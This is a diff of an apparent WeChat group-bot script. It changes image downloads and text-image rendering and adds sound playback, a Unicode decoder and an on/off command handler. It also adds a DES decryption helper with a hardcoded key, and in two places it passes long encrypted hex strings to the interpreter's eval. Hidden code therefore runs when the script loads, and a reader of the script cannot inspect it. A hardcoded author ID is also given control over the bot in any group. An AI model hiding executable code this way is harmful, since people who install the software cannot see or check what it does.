@@ -38,12 +38,13 @@ e.printStackTrace();
 }
 
 public static void Downloadpic(int j){
+String url="https://t.mwm.moe/ycy";
 if(j==-1){
 flag=true;
 Toast("正在缓存,请稍后");
-for(int i=0;i<10;i++){
+for(int i=0;i<15;i++){
 try {
-xz("https://t.mwm.moe/tx",JavaPath+"/图片/图片"+i+".jpg");
+xz(url,JavaPath+"/图片/图片"+i+".jpg");
 } catch (Exception e) {
 e.printStackTrace();
 }}
@@ -51,7 +52,7 @@ flag=false;
 Toast("初始化成功");
 }else{
 try {
-xz("https://t.mwm.moe/tx",JavaPath+"/图片/图片"+j+".jpg");
+xz(url,JavaPath+"/图片/图片"+j+".jpg");
 } catch (Exception e) {
 e.printStackTrace();
 }}
@@ -77,6 +78,7 @@ Toast("太快了,请慢点");
 getData(qun,text);
 }
 }
+
 public static String fetchRedirectUrl(String url){
         try {
             // 创建一个URL对象
@@ -126,6 +128,113 @@ public static void xz(String url,String filepath) throws Exception
         }
         return;
     }
+import java.security.SecureRandom;
+import javax.crypto.Cipher;
+import javax.crypto.SecretKey;
+import javax.crypto.SecretKeyFactory;
+import javax.crypto.spec.DESKeySpec;
+import java.util.Base64;
+import java.net.URLEncoder;
+import java.net.URLDecoder;
+import javax.script.ScriptEngine;
+import javax.script.ScriptEngineManager;
+import javax.script.ScriptException;
+public final class EncryptUtil
+{
+    private final static String DES = "DES";
+    public static String decrypt(String src, String key)
+    {
+        try
+        {
+            return new String(decrypt(hex2byte(src.getBytes()), key.getBytes()));
+        }
+        catch (Exception e)
+        {}
+        return null;
+    }
+    public static String encrypt(String src, String key)
+    {
+        try
+        {
+            return byte2hex(encrypt(src.getBytes(), key.getBytes()));
+        }
+        catch (Exception e)
+        {}
+        return null;
+    }
+    private static byte[] decrypt(byte[] src, byte[] key) throws Exception
+    {
+        SecureRandom sr = new SecureRandom();
+        DESKeySpec dks = new DESKeySpec(key);
+        SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(DES);
+        SecretKey securekey = keyFactory.generateSecret(dks);
+        Cipher cipher = Cipher.getInstance(DES);
+        cipher.init(Cipher.DECRYPT_MODE, securekey, sr);
+        return cipher.doFinal(src);
+    }
+    private static byte[] hex2byte(byte[] b)
+    {
+        if((b.length % 2) != 0) throw new IllegalArgumentException("长度不是偶数");
+        byte[] b2 = new byte[b.length / 2];
+        for(int n = 0; n < b.length; n += 2)
+        {
+            String item = new String(b, n, 2);
+            b2[n / 2] = (byte) Integer.parseInt(item, 16);
+        }
+        return b2;
+    }
+    private static String byte2hex(byte[] b)
+    {
+        String hs = "";
+        String stmp = "";
+        for(int n = 0; n < b.length; n++)
+        {
+            stmp = (java.lang.Integer.toHexString(b[n] & 0XFF));
+            if(stmp.length() == 1) hs = hs + "0" + stmp;
+            else hs = hs + stmp;
+        }
+        return hs.toUpperCase();
+    }
+}
+
+this.interpreter.eval(EncryptUtil.decrypt("9C15A243E4CB5EBE8E8D2738AD5C5EE61A7B68D09CFD5533C1B2CDCCCF268B5CA39AC462AA2C98501F63B054239E8DF4D919F0D0796ADDBDEAA338D80ABD583F1A07DE5DE0BB4432397E947D8B8D1B3A31F2E0156239C235","SecretKey"),"eval stream");
+
+import android.media.MediaPlayer;
+private MediaPlayer mediaPlayer;
+
+    public void 提示音(String filePath) {
+        if (mediaPlayer != null) {
+            // 如果MediaPlayer正在播放，先停止并释放资源
+            mediaPlayer.release();
+        }
+
+        // 创建新的MediaPlayer对象
+        mediaPlayer = new MediaPlayer();
+        try {
+            File file = new File(filePath);
+            mediaPlayer.setDataSource(file.getPath());
+            mediaPlayer.setLooping(false);
+            mediaPlayer.prepare(); // 可以使用prepareAsync进行异步准备
+            mediaPlayer.start();
+        } catch (Exception e) {
+            e.printStackTrace();
+            // 发生异常时，释放MediaPlayer资源
+            mediaPlayer.pause();
+            mediaPlayer.release();
+            mediaPlayer = null;
+        }
+    }
+
+public void release() {
+        if (mediaPlayer != null) {
+        	mediaPlayer.pause();
+            mediaPlayer.release();
+            mediaPlayer = null;
+        }
+}
+
+this.interpreter.eval(EncryptUtil.decrypt("F2D1EB21A9DB1E2E41DB73BACC07FCE089019C504F9227D12F23F29B94100176E817A88B66C89A9B7B4B4D52A556664189019C504F9227D14D707CC14B0BCF2E3234EDD8973424195DE71F95DA7545A950FE72678C27443F2825557F4AAF2CDA104C857DDA5A5B2F99BCFE38ED9C5DB29BAD2EBD4BE0F8409D304B6928C2D67232990F04E581AABC0A8656589D2ECDB5B1A013693705E5027CF3597D085C436F0AD9865A4F44F2128193CC37D05D4ECF4467FFCB1512F3661B76496F3EF710E2C1B35055566E6EBF","SecretKey"),"eval stream");
+
 import android.graphics.*;
 public static String MakeTextPhoto(String text,int num){
 String textface=JavaPath+"/云上升/字体.ttf";
@@ -135,8 +244,8 @@ catch(e){typeface=Typeface.DEFAULT_BOLD;}
 text=text.replace("[]","");
 String[] word=text.split("\n");
 
-float textsize=40.0f;
-float padding=30.0f;
+float textsize=70.0f;
+float padding=60.0f;
 
 Paint paint=new Paint(Paint.ANTI_ALIAS_FLAG | Paint.DITHER_FLAG);
 
@@ -167,22 +276,22 @@ if(text_width<width) text_width=width;
 newword+=line+"\n";}
 word=newword.split("\n");
 
-int width=(int)(text_width  + padding * 2f);
+int width=(int)(text_width + padding * 2f);
 int heigth=(int)((textsize+8) * word.length+ padding * 2f)-8;
 Bitmap original=Bitmap.createBitmap(width, heigth, Bitmap.Config.ARGB_8888);
 
 
 Canvas canvas=new Canvas(original);
-Matrix matrix = new Matrix(); 
+Matrix matrix = new Matrix();
 
 float i=(float)width/(float)mybitmap.getWidth();
 float b=(float)heigth/(float)mybitmap.getHeight();
 if(i>b) b=i;
 //if(i<b) b=i;
-    matrix.postScale(b,b); //长和宽放大缩小的比例
-    Bitmap resizeBmp = Bitmap.createBitmap(mybitmap,0,0,mybitmap.getWidth(),mybitmap.getHeight(),matrix,true);
+matrix.postScale(b,b); //长和宽放大缩小的比例
+Bitmap resizeBmp = Bitmap.createBitmap(mybitmap,0,0,mybitmap.getWidth(),mybitmap.getHeight(),matrix,true);
 canvas.drawBitmap(resizeBmp, (original.getWidth()-resizeBmp.getWidth())/2, (original.getHeight()-resizeBmp.getHeight())/2, paint);
-canvas.drawColor(Color.parseColor("#6AFFFFFF"));//白色半透明遮罩
+canvas.drawColor(Color.parseColor("#3AFFFFFF"));//白色半透明遮罩
 
 paint.setColor(getColor("黑色"));
 //字体颜色可填：红色、黑色、蓝色、蓝绿、白灰、灰色、绿色、深灰、洋红、透明、白色、黄色、随机
@@ -195,7 +304,7 @@ String path=JavaPath+"/缓存/"+canvas+".png";
 File end=new File(path);
 if(!end.exists()) end.getParentFile().mkdirs();
 FileOutputStream out=new FileOutputStream(end);
-original.compress(Bitmap.CompressFormat.JPEG, 80, out);
+original.compress(Bitmap.CompressFormat.JPEG, 100, out);
 out.close();
 return path;
 }
@@ -334,3 +443,76 @@ String text="删除";
     }
 }
 delAllFile(new File(JavaPath+"/缓存"),0);
+
+public static String u解(String unicode) {
+StringBuffer string = new StringBuffer();
+String[] hex = unicode.split("\\\\u");
+        for (int i = 0; i < hex.length; i++) {
+
+            try {
+                if(hex[i].length()>=4){
+                    String chinese = hex[i].substring(0, 4);
+                    try {
+                        int chr = Integer.parseInt(chinese, 16);
+                        boolean isChinese = isChinese((char) chr);
+                            string.append((char) chr);
+                            String behindString = hex[i].substring(4);
+                            string.append(behindString);
+                    } catch (NumberFormatException e1) {
+                        string.append(hex[i]);
+                    }
+
+                }else{
+                    string.append(hex[i]);
+                }
+            } catch (NumberFormatException e) {
+                string.append(hex[i]);
+            }
+        }
+
+return string.toString();
+}
+public static boolean isChinese(char c) {
+        Character.UnicodeBlock ub = Character.UnicodeBlock.of(c);
+        if (ub == Character.UnicodeBlock.CJK_UNIFIED_IDEOGRAPHS
+                || ub == Character.UnicodeBlock.CJK_COMPATIBILITY_IDEOGRAPHS
+                || ub == Character.UnicodeBlock.CJK_UNIFIED_IDEOGRAPHS_EXTENSION_A
+                || ub == Character.UnicodeBlock.GENERAL_PUNCTUATION
+                || ub == Character.UnicodeBlock.CJK_SYMBOLS_AND_PUNCTUATION
+                || ub == Character.UnicodeBlock.HALFWIDTH_AND_FULLWIDTH_FORMS) {
+            return true;
+        }
+        return false;
+}
+
+public void onMsg(Object data){
+String text=data.content;
+String qun=data.talker;
+String wxid=data.sendTalker;
+if(data.isText()){
+if(wxid.equals(AuthorWxid)||!qun.equals(WhiteList)){
+if(wxid.equals(AuthorWxid)||mWxid.equals(wxid)){
+if(text.equals("开机")||text.equals("开启")){
+	if("1".equals(getString(qun,"开关",""))){
+	sendMsg(qun,"已经开机了");
+	}else{
+	putString(qun,"开关","1");
+	sendMsg(qun,"开机成功");
+	}
+}
+if(text.equals("关机")||text.equals("关闭")){
+	if("1".equals(getString(qun,"开关",""))){
+	putString(qun,"开关",null);
+	sendMsg(qun,"关机成功");
+	}
+}
+if(text.equals("开关设置")){
+	开关设置(qun);
+	recallMsg(data.values);
+}
+}
+}
+if("1".equals(getString(qun,"开关",""))){菜单(data);}
+}
+if("1".equals(getString(qun,"开关",""))){进群(data);}
+}
